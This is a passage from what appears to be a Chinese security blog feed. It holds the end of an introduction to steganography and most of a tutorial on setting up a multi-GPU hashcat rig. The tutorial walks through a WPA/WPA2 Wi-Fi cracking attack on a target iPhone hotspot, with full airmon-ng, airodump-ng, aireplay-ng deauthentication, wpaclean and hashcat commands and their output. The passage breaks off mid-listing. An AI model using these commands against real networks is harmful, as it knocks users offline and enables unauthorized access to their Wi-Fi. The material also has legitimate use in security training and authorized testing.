src="/2019/05/29/隐写术(一)--简介/8343187-49f51820ef195755.png" title="fig:" alt="数字水印信号检测模型"></div><p>广义的隐写模型中，有两个重要的步骤，分别是嵌入（Embed）和提取（Extract），对应上两图的嵌入算法和提取算法。</p><p>对于<strong>嵌入过程（Imbedded Process）</strong>，利用嵌入算法，甚至使用密码学算法，用密钥进行加密，使秘密信息嵌入进载体当中。对于数字媒体，载体包括：音频、视频、图像、文本等。对于秘密信息，同样包括：音频、视频、图像、文本等。例如，如今黑客常见的攻击方法就是将payload嵌入到图片当中，这一段payload是代码段，这段代码段是恶意的代码，一旦感染计算机系统很容易被提取权限、控制计算机等。秘密信息嵌入到载体之后，会生成一个新的数字媒体对象，我们把它叫做载密对象。为了确保在公开的传输通道传输过程中不被攻击者发现嵌入的秘密信息，载体与载密对象的差别必须非常微小，甚至无法察觉出来。</p><p>对于<strong>传输过程（Transfer Process）</strong>，攻击者可以在这个过程中获得嵌入秘密信息后地载密对象。攻击者获得之后，首先检查载密对象对外呈现的（显现的）信息是否有威胁，其次再尝试各种方法、各种算法、工具分析除显现的信息（载体呈现出来的信息）之外的其他信息，即载密信息。一旦被攻击者成功提取或察觉出该载体对象含有秘密信息，则秘密信息的隐写传递失败，否则或送达给秘密信息的接收者。</p><p>对于<strong>提取过程（Extraction Processes）</strong>，我们可以把它看成是嵌入过程的逆过程。合法的接收者接收到来自发送者发送的载密对象，利用一定的提取算法（有可能需要解密算法）提取隐藏在载密对象的秘密信息。在这一过程中，如果只需载体信号便可提取出秘密信息，我们称之为非盲提取；如果不需要载体信息即可提取秘密信息，称之为盲提取。</p><h3 id="x12-信息隐藏性能评价">0x12 信息隐藏性能评价</h3><p>虽然信息隐藏技术涵盖多个学科，分类复杂，但是对其性能的评估有共同的指标，这些指标分别有[2],[3]： 1. 不可感知性（Imperceptibilit） 载体被嵌入隐藏信息之后，很难甚至不能被人为感知、预测。不可感知性包括不可见性和不可测性两个维度。不可见性表示载体嵌入信息后，不会造成载体对象的可感知失真，保证原始载体文件与载密文件具有高度相似性；不可测性表示对攻击者来说，难以提取、难以分辨载密文件的隐藏信息，或者说提取、检测的代价无穷大。</p><ol start="2" type="1"><li><p>鲁棒性（Robustnes） 即稳定性（Stability），嵌入载体的信息即使受到一定程度的干扰，也能恢复原来的状态，保持隐藏信息的准确性的能力。即需要保证隐藏信息的稳定性，不能轻易的被干扰、失去。在一般的隐写系统中，鲁棒性往往跟安全性、嵌入容量有非常强的相关性，不能都兼顾，需要根据特定的隐写场景取其最合适的性能。</p></li><li><p>安全性（Security） 即保密性（privacy），指载密对象即使受到攻击者恶意分析、攻击仍能保持信息不被感知、提取的能力。通常为了保证隐藏信息的安全性，会使用密码学的加解密算法，利用密钥进行保护以保障隐藏信息的安全能力。如果一个数字隐写系统是绝对安全的，那么这个系统能够抵抗来自攻击者多维、全方向的攻击，并且攻击者拥有无限的计算能力。数字隐写系统的被攻击的过程大致可分为：证明秘密信息的存在、提取秘密信息和破坏秘密信息等三个环节。</p></li><li><p>隐藏容量和强度（Hide capacity and strength） 即表征载体对象能够隐藏信息的容量大小。在保证不可感知性和安全性的前提下，隐藏容量越大越好。隐藏容量可以从空域、频域等多个维度来考虑，每种维度的容量有所差别。通常需要在隐藏容量、不可感知性、鲁棒性、安全性当中做取舍。因为嵌入的信息越多，在一定条件下安全性和鲁棒性就越脆弱。</p></li><li><p>嵌入效率（Embedding efficiency） 即嵌入信息的比特数与嵌入信息后所修改的载体的比特数之比。在嵌入相同的隐藏信息比特条件下，嵌入效率也高，改变的相对比特数越少，嵌入算法安全性越高。目前有多种算法可以提高嵌入效率，如：栅格码[4]、湿纸码[5]、快速BCH码[6]等。</p></li></ol><p>正如上面指标中所指出的，每种性能都有其特性，提高一种性能的指标，势必会对其他几个性能指标有所影响，所以需要全面、综合考虑这几个性能之间的联系，需要考虑应用的用途、对象等条件综合选择这几个性能。J.Fridrich在[7]中提出不可感知性、隐藏容量、鲁棒性三者之间的三角联系，如图所示：</p><div style="text-align: center;"><img src="/2019/05/29/隐写术(一)--简介/8343187-75d710034ada886f.png" title="fig:" alt="不可感知性、鲁棒性、安全性关系“铁三角”"></div><blockquote><p>[1] Artz D. Digital steganography: hiding data within data[J]. Internet Computing IEEE, 2001, 5(3):75-80. [2] 刘培培. 图像脆弱数字水印和数字隐写的几个关键技术研究[D]. 西南交通大学, 2008. [3] 陈波, 谭运猛, 吴世忠. 信息隐藏技术综述[J]. 计算机与数字工程, 2005, 33(2):21-23. [4] T Filler ，J Judas ，J Fridrich. Minimizing Additive Distortion in Steganography Using Syndrome-Trellis Codes. IEEE Signal Processing Society, 2011. [5] Fridrich J, Goljan, Soukal D. Wet paper codes with improved embedding efficiency[J]. IEEE Transactions on Information Forensics and Security, 2006, 1(1):102-110. [6] Zhang R, Sachnev V, Kim H J. Fast BCH Syndrome Coding for Steganography[J].  2009. [7] Fridrich J . Applications of data hiding in digital images[C] International Symposium on Signal Processing &amp; Its Applications. IEEE, 1998.</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;x00-隐写术背景&quot;&gt;0x00 隐写术背景&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;在信息时代的发展、计算机软硬件的升级、多媒体技术的发展的背景下，信息隐藏愈发朝气蓬勃，已经逐渐成为信息安全研究不可或缺的方向。数千年来，人们一直希望对某些敏感的信息进行保密传送，随即发展出信息加密技术和信息隐藏技术等。在今天这个数字媒体技术和互联网技术爆发的时代，人们这样的需求更加迫切，如何在通信中保证传输秘密信息的隐蔽性已成为研究者、企业、国家关注的课题。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://www.killshadow.xyz/tags/CTF/"/>
    
      <category term="MISC" scheme="http://www.killshadow.xyz/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu18.04+8x1080ti爆破环境从零搭建</title>
    <link href="http://www.killshadow.xyz/2018/10/24/Ubuntu18.04+8x1080ti%E7%88%86%E7%A0%B4%E7%8E%AF%E5%A2%83%E4%BB%8E%E9%9B%B6%E6%90%AD%E5%BB%BA/"/>
    <id>http://www.killshadow.xyz/2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/</id>
    <published>2018-10-24T12:20:38.498Z</published>
    <updated>2018-10-25T01:59:01.907Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>硬件环境:</p><p>主机: TYAN FT77D-B7109</p><p>CPU: Intel Xeon Scalable Processor</p><p>GPU: 1080Ti x 8 (测试时只用了两块, 分别是MSI/技嘉)</p><p>内存: 32G</p><p>硬盘: 1T SSD</p></blockquote><a id="more"></a><h2 id="x00-配置环境">0x00 配置环境</h2><h3 id="x01-安装系统">0x01 安装系统</h3><blockquote><p>目标系统: <a href="https://www.ubuntu.com/download/desktop" target="_blank" rel="noopener">Ubuntu 18.04.1 LTS Desktop</a> (建议安装Server版)</p></blockquote><p>在官网下载好启动盘之后, 用烧录工具(建议用<a href="https://sourceforge.net/projects/win32diskimager/" target="_blank" rel="noopener">win32diskimager</a>)写入U盘, 然后进入启动项选为U盘启动, 接下来开始安装, 一路默认配置就好. 具体步骤请谷歌, 这里就不赘述了. (这里我们遇到一个坑, 就是插了PCIE网卡之后安装系统一直重启, 可能是主机的兼容性问题, 装系统的时候如果条件允许, 最好把所有的外置设备卸载掉)</p><h3 id="x02-安装gpu驱动">0x02 安装GPU驱动</h3><ol type="1"><li><p>安装好系统之后, 可以配置一下更新源(<code>/etc/apt/sources.list</code>,我用的是中科大源), update一下系统.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line">sudo apt-get install gcc make p7zip-full git lsb-core</span><br></pre></td></tr></table></figure></li><li><p>然后将Nouveau(NVIDIA通用显卡驱动)禁用:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c <span class="string">"echo blacklist nouveau &gt; /etc/modprobe.d/blacklist-nvidia-nouveau.conf"</span></span><br><span class="line">sudo bash -c <span class="string">"echo options nouveau modeset=0 &gt;&gt; /etc/modprobe.d/blacklist-nvidia-nouveau.conf"</span></span><br><span class="line">sudo update-initramfs -u</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure></li><li><p>等重启之后, 再添加32位的NVIDIA驱动源:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install build-essential libc6:i386</span><br></pre></td></tr></table></figure></li><li><p>在官网下载<a href="http://www.nvidia.com/Download/index.aspx" target="_blank" rel="noopener">驱动</a>, 下载好之后:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x NVIDIA*.run</span><br><span class="line">sudo ./NVIDIA*.run</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure><p>或者:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://us.download.nvidia.com/XFree86/Linux-x86_64/375.26/NVIDIA-Linux-x86_64-375.26.run</span><br><span class="line">chmod +x NVIDIA-Linux-x86_64-375.26.run</span><br><span class="line">sudo ./NVIDIA-Linux-x86_64-375.26.run</span><br></pre></td></tr></table></figure></li><li><p>(可选步骤)安装CPU集成显卡驱动:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://registrationcenter-download.intel.com/akdlm/irc_nas/9019/opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25.tgz</span><br><span class="line">tar -xvf opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25.tgz</span><br><span class="line"><span class="built_in">cd</span> opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure></li><li><p>这时候可以看一下显卡配置:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lspci | grep VGA</span><br></pre></td></tr></table></figure></li></ol><h3 id="x03-安装hashcat">0x03 安装hashcat</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://hashcat.net/files/hashcat-3.30.7z</span><br><span class="line">7z x hashcat-3.30.7z</span><br><span class="line"><span class="built_in">cd</span> hashcat-3.30</span><br></pre></td></tr></table></figure><p>这是个比较老的版本, 我用的aircrack跑出来的包用这个版本可以跑. 如果想尝一下鲜也可以:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://hashcat.net/files/hashcat-4.2.1.7z</span><br></pre></td></tr></table></figure><p>顺便测试一下速度(在解压后的目录里直接运行<code>./example0.sh</code>即可):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Bypass</span><br><span class="line">Hash.Type........: MD5</span><br><span class="line">Hash.Target......: example0.hash</span><br><span class="line">Time.Started.....: Sat Oct 20 20:08:33 2018 (27 mins, 0 secs)</span><br><span class="line">Time.Estimated...: Sat Oct 20 22:31:24 2018 (1 hour, 55 mins)</span><br><span class="line">Guess.Base.......: File (example.dict), Right Side</span><br><span class="line">Guess.Mod........: Mask (?a?a?a?a?a?a) [6], Left Side</span><br><span class="line">Guess.Queue.Base.: 1/1 (100.00%)</span><br><span class="line">Guess.Queue.Mod..: 1/1 (100.00%)</span><br><span class="line">Speed.Dev.<span class="comment">#2.....:  8340.3 MH/s (6.61ms) @ Accel:128 Loops:64 Thr:256 Vec:1</span></span><br><span class="line">Speed.Dev.<span class="comment">#3.....:  7938.7 MH/s (6.93ms) @ Accel:128 Loops:64 Thr:256 Vec:1</span></span><br><span class="line">Speed.Dev.<span class="comment">#*.....: 16279.0 MH/s</span></span><br><span class="line">Recovered........: 3035/6494 (46.74%) Digests, 0/1 (0.00%) Salts</span><br><span class="line">Recovered/Time...: CUR:25,N/A,N/A AVG:29,1773,42558 (Min,Hour,Day)</span><br><span class="line">Progress.........: 26411945426944/139573552218112 (18.92%)</span><br><span class="line">Rejected.........: 0/26411945426944 (0.00%)</span><br><span class="line">Restore.Point....: 200933376/1073741824 (18.71%)</span><br><span class="line">Candidates.<span class="comment">#2....: sarusix102x -&gt; 6o9momx49wy3c2</span></span><br><span class="line">Candidates.<span class="comment">#3....: sarseeethelia3 -&gt; 6o9602eugeni</span></span><br><span class="line">HWMon.Dev.<span class="comment">#2.....: Temp: 79c Fan: 62% Util: 94% Core:1860MHz Mem:5005MHz Bus:16</span></span><br><span class="line">HWMon.Dev.<span class="comment">#3.....: Temp: 84c Fan: 78% Util: 94% Core:1771MHz Mem:5005MHz Bus:16</span></span><br><span class="line"></span><br><span class="line">Started: Sat Oct 20 20:08:26 2018</span><br><span class="line">Stopped: Sat Oct 20 20:35:35 2018</span><br></pre></td></tr></table></figure><ul><li><p>关于上面输出的参数解析:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">实际上example0.sh的命令如下:</span><br><span class="line">./hashcat64.bin -t 32 -a 7 example0.hash ?a?a?a?a example.dict</span><br><span class="line"></span><br><span class="line">Session..........:</span><br><span class="line">Status...........: </span><br><span class="line">Hash.Type........: 表示哈希计算的类型</span><br><span class="line">Hash.Target......: 表示目标哈希表</span><br><span class="line">Time.Started.....: 计算开始时间</span><br><span class="line">Time.Estimated...: 估计结束时间</span><br><span class="line">Guess.Base.......: 密码字典</span><br><span class="line">Guess.Mod........: 密码类型(大小写/数字等)</span><br><span class="line">Guess.Queue.Base.:</span><br><span class="line">Guess.Queue.Mod..:</span><br><span class="line">Speed.Dev.<span class="comment">#2.....: 显卡1的速度(8340.0MH/s 约等于每秒83亿次运算)</span></span><br><span class="line">Speed.Dev.<span class="comment">#3.....: 显卡2...</span></span><br><span class="line">Speed.Dev.<span class="comment">#*.....: 总速度</span></span><br><span class="line">Recovered........: </span><br><span class="line">Recovered/Time...: 当前已用时间(分,时,天); 平均需要时间(分,时,天)</span><br><span class="line">Progress.........: 当前进度</span><br><span class="line">Rejected.........: 应该是丢包率(猜的)</span><br><span class="line">Restore.Point....: 当前的进度</span><br><span class="line">Candidates.<span class="comment">#2....: 即将尝试爆破的密码(猜的)</span></span><br><span class="line">Candidates.<span class="comment">#3....: </span></span><br><span class="line">HWMon.Dev.<span class="comment">#2.....: Temp表示当前显卡温度;Fan表示风扇转速;Men内存频率</span></span><br><span class="line">HWMon.Dev.<span class="comment">#3.....: Util表示内存使用率;Core表示GPU核频率;Bus通道数</span></span><br></pre></td></tr></table></figure></li><li><p>关于hashcat命令参数解析(详见<a href="#附录一">附录一</a>):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-a  指定要使用的破解模式</span><br><span class="line">-m  指定要破解的hash类型所对应的id[下面有一份完整的hash id对照表],几乎现在市面上常用的一些散列类型它都支持,而且每个版本更新都会增加一些新的算法</span><br><span class="line">-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中</span><br><span class="line">--force忽略破解过程中的警告信息,跑单条hash可能需要加上此选项</span><br><span class="line">--show显示已经破解的hash及该hash所对应的明文</span><br><span class="line">--increment 启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程,其实,并不建议这么用,因为破解时间可能会比较长</span><br><span class="line">--increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用</span><br><span class="line">--increment-max  密码最大长度,同上</span><br><span class="line">--outfile-format 指定破解结果的输出格式id,一般自己常用3</span><br><span class="line">--username  忽略hash文件中的指定的用户名,在破解win和linux系统用户密码hash可能会用到</span><br><span class="line">--remove  删除已被破解成功的hash</span><br><span class="line">-r 使用自定义破解规则,这个后期抽空再说吧,比较的复杂,不是一两句话能说完的</span><br></pre></td></tr></table></figure></li><li><p>真实爆破WiFi密码情况系hashcat参数解析:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hashcat64.bin -m 2500 -a 3 wpahash.hccap ?l?l?l?l?l?l?l?l</span><br></pre></td></tr></table></figure><blockquote><p>-m : hash的类型, 2500代表的是WPA/WPA2协议. 详见<a href="②%20Hash种类">② Hash种类</a></p><p>-a: 有多种参数, 3表示穷举. 详见<a href="#⑤%20攻击模式">⑤ 攻击模式</a></p><p>*.hccap: 即为<code>aircrack</code>抓到的包之后转化而来的</p><p>?l: 表示所有的小写字母. 详见<a href="⑥%20内置字符集">⑥ 内置字符集</a></p></blockquote></li></ul><h2 id="x10-crack实战">0x10 Crack实战</h2><h3 id="x11-初始配置">0x11 初始配置</h3><ol type="1"><li><p>首先需要找一个可以监听注入的USB网卡, 如果笔记本自带网卡能用就更好了. 这里以<code>rt2800usb</code>为例讲解:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks<span class="comment"># airmon-ng </span></span><br><span class="line">PHYInterfaceDriverChipset</span><br><span class="line">phy0wlp3s0iwlwifiIntel Corporation Device 24fb (rev 10)</span><br><span class="line">phy1wlx7cdd90f1f416rt2800usbRalink Technology, Corp. RT2870/RT3070</span><br></pre></td></tr></table></figure><p>可以看到, 有两张网卡, <code>wlp3s0</code>是笔记本自带的英特尔系列网卡; <code>lx7cdd90f1f416</code>是能够监听的新插入的usb网卡.</p></li><li><p>查看网卡状态, 两张网卡的Mode都是<code>Managed</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks<span class="comment"># iwconfig</span></span><br><span class="line">wlx7cdd90f1f416  IEEE 802.11  ESSID:off/any  </span><br><span class="line">Mode:Managed  Access Point: Not-Associated   Tx-Power=off   </span><br><span class="line">Retry short  long <span class="built_in">limit</span>:2   RTS thr:off   Fragment thr:off</span><br><span class="line">Encryption key:off</span><br><span class="line">Power Management:off</span><br><span class="line">lo        no wireless extensions.</span><br><span class="line">wlp3s0    IEEE 802.11  ESSID:off/any  </span><br><span class="line">Mode:Managed  Access Point: Not-Associated   Tx-Power=off   </span><br><span class="line">Retry short <span class="built_in">limit</span>:7   RTS thr:off   Fragment thr:off</span><br><span class="line">Encryption key:off</span><br><span class="line">Power Management:on</span><br><span class="line">enp2s0    no wireless extensions.</span><br><span class="line">enp0s20f0u1  no wireless extensions.</span><br></pre></td></tr></table></figure></li><li><p>为了避免冲突, 先杀占用进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks<span class="comment"># airmon-ng check kill</span></span><br><span class="line"></span><br><span class="line">Killing these processes:</span><br><span class="line"></span><br><span class="line">  PID Name</span><br><span class="line">  891 wpa_supplicant</span><br><span class="line"> 3091 dhclient</span><br><span class="line"> 4430 avahi-daemon</span><br><span class="line"> 4431 avahi-daemon</span><br></pre></td></tr></table></figure></li><li><p>然后将能够抓包的网卡的Mode设为<code>Monitor</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks<span class="comment"># airmon-ng start wlx7cdd90f1f416</span></span><br><span class="line"></span><br><span class="line">Found 2 processes that could cause trouble.</span><br><span class="line">If airodump-ng, aireplay-ng or airtun-ng stops working after</span><br><span class="line">a short period of time, you may want to run <span class="string">'airmon-ng check kill'</span></span><br><span class="line"></span><br><span class="line">  PID Name</span><br><span class="line"> 7674 avahi-daemon</span><br><span class="line"> 7675 avahi-daemon</span><br><span class="line"></span><br><span class="line">PHYInterfaceDriverChipset</span><br><span class="line"></span><br><span class="line">phy0wlp3s0iwlwifiIntel Corporation Device 24fb (rev 10)</span><br><span class="line">phy4wlx7cdd90f1f416rt2800usbRalink Technology, Corp. RT2870/RT3070</span><br><span class="line">truewlx7cdd90f1f416 is soft blocked, please run <span class="string">"rfkill unblock wlx7cdd90f1f416"</span> to use this interface.</span><br><span class="line">rfkill error, unable to start wlx7cdd90f1f416</span><br><span class="line"></span><br><span class="line">Would you like to try and automatically resolve this? [y/n] y</span><br><span class="line">rfkill error: rfkill: invalid identifier: 4</span><br><span class="line">Unable to unblock.</span><br><span class="line">Interface 15mon is too long <span class="keyword">for</span> linux so it will be renamed to the old style (wlan<span class="comment">#) name.</span></span><br><span class="line"></span><br><span class="line">truetrue(mac80211 monitor mode vif enabled on [phy4]wlan0mon</span><br><span class="line">truetrue(mac80211 station mode vif disabled <span class="keyword">for</span> [phy4]wlx7cdd90f1f416)</span><br></pre></td></tr></table></figure></li><li><p>此时再看一下无线网卡状态:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks<span class="comment"># iwconfig</span></span><br><span class="line">lo        no wireless extensions.</span><br><span class="line"></span><br><span class="line">wlp3s0    IEEE 802.11  ESSID:off/any  </span><br><span class="line">          Mode:Managed  Access Point: Not-Associated   Tx-Power=0 dBm   </span><br><span class="line">          Retry short <span class="built_in">limit</span>:7   RTS thr:off   Fragment thr:off</span><br><span class="line">          Encryption key:off</span><br><span class="line">          Power Management:on</span><br><span class="line">          </span><br><span class="line">wlan0mon  IEEE 802.11  Mode:Monitor  Tx-Power=off   </span><br><span class="line">          Retry short  long <span class="built_in">limit</span>:2   RTS thr:off   Fragment thr:off</span><br><span class="line">          Power Management:off</span><br><span class="line">          </span><br><span class="line">enp2s0    no wireless extensions.</span><br><span class="line"></span><br><span class="line">enp0s20f0u1  no wireless extensions.</span><br></pre></td></tr></table></figure><p>已更改~</p></li></ol><h3 id="x12-实施攻击">0x12 实施攻击</h3><ol type="1"><li><p>我们的攻击目标是<code>iPhone</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks<span class="comment"># airodump-ng wlan0mon</span></span><br></pre></td></tr></table></figure><figure><img src="/2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/1540284494095.png" alt="img"><figcaption>img</figcaption></figure><p>上图可看到它的mac是<code>74:D2:1D:AE:3F:94</code>, 信道(CH)是<code>1</code>. (记住这两个信息下面有用)</p></li><li><p>接下来我们开两个shell, 一个shell负责监听握手包, 另一个shell负责洪荒攻击两个正常连接的WiFi设备, 我们先看看第一个shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng --bssid 74:D2:1D:AE:3F:94 -c 1 -w <span class="built_in">test</span> wlan0mon</span><br></pre></td></tr></table></figure><figure><img src="/2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/1540286260611.png" alt="img"><figcaption>img</figcaption></figure><p>可以看出来已经抓到了握手包703个. 对命令参数解释如下:</p><blockquote><p>--bssid: 表示WiFi热点的mac</p><p>-c: 表示信道1</p><p>-w: 后面跟着文件名</p><p>wlan0mon: 需要监听的网卡</p></blockquote></li><li><p>开启了监听之后, 我们就需要DDoS目标连接了, 这时候在另一个shell输入如下命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng --deauth 5 -a 74:D2:1D:AE:3F:94 wlan0mon</span><br></pre></td></tr></table></figure><p>隔几秒发一次, 以抓到足够的握手包, 减少爆破的时间.</p></li></ol><h2 id="x20-开始爆破">0x20 开始爆破</h2><p>在上面操作的监听过程中, 会在当前路径下保存一个抓到的握手包的数据, 但这个流量包还不能直接让hashcat跑, 需要做简单的处理, 先做一个简单的数据清洗:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ks:~/crack_packet_wifi<span class="comment"># wpaclean wpapass.cap test-05.cap </span></span><br><span class="line">Pwning <span class="built_in">test</span>-05.cap (1/1 100%)</span><br><span class="line">Net 74:d2:1d:ae:3f:94 iPhone</span><br><span class="line">Done</span><br></pre></td></tr></table></figure><p>可以看到, 已经成功识别出目标无限的mac. 接下来我们吧数据包转换成hashcat能够识别的hash类型:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 